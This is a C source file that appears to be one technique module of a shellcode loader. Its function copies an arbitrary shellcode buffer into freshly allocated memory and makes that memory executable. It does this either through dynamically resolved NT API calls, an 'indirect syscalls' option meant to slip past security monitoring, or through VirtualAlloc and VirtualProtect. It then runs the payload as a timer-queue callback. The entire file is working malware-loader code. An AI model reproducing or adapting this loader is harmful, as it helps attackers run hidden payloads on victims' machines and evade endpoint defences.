#include "../config.h"
#include "../dispatch.h"
#include "../ntapi.h"

BOOL tech_timer_queue(unsigned char *sc, size_t len) {
#if USE_INDIRECT_SYSCALLS
    fnNtAllocateVirtualMemory pAlloc =
        (fnNtAllocateVirtualMemory)ntapi_resolve("NtAllocateVirtualMemory");
    fnNtProtectVirtualMemory pProtect =
        (fnNtProtectVirtualMemory)ntapi_resolve("NtProtectVirtualMemory");
    if (!pAlloc || !pProtect) return FALSE;

    PVOID mem = NULL;
    SIZE_T sz = len;
    if (!NT_SUCCESS(pAlloc((HANDLE)-1, &mem, 0, &sz,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        return FALSE;

    memcpy(mem, sc, len);

    ULONG old = 0;
    pProtect((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);
#else
    LPVOID mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, sc, len);

    DWORD old;
    VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old);
#endif

    HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    HANDLE hTimer = NULL;
    CreateTimerQueueTimer(&hTimer, NULL,
                          (WAITORTIMERCALLBACK)mem,
                          NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);
    WaitForSingleObject(hEvent, INFINITE);
    return TRUE;
}
